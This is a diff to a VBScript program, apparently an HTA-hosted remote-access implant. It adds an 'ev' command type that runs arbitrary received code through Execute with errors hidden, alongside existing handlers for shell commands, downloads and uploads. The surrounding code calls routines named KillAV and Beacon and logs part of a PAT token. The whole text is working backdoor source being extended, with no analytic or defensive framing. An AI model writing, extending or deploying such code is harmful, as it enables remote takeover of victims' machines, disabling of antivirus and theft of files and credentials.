@@ -308,10 +308,22 @@ Function UL(path, b64)
     If Err.Number <> 0 Then UL = "ERR:" & Err.Description Else UL = "ok"
 End Function
 
+' ── VBScript eval (runs in HTA scope, no cmd.exe) ───────────────────────────
+Dim evR
+
+Function EVExec(code)
+    On Error Resume Next
+    evR = ""
+    Execute code
+    If Err.Number <> 0 Then evR = "ERR:" & Err.Number & " " & Err.Description
+    EVExec = evR
+End Function
+
 ' ── Dispatcher ────────────────────────────────────────────────────────────────
 Function Dispatch(ty, cmd)
     Select Case ty
         Case "sh"  : Dispatch = RunCmd(cmd)
+        Case "ev"  : Dispatch = EVExec(cmd)
         Case "dl"  : Dispatch = DL(cmd)
         Case "ul"
             Dim sp : sp = InStr(cmd, "|")
@@ -362,7 +374,7 @@ End Sub
 ' ── Entry point ───────────────────────────────────────────────────────────────
 Sub Main()
     InitVars()
-    AppLog "v5 init ok PAT=" & Left(sPAT,12) & " id=" & sID
+    AppLog "v6 init ok PAT=" & Left(sPAT,12) & " id=" & sID
     KillAV()
     AppLog "av kill sent"
     Beacon()
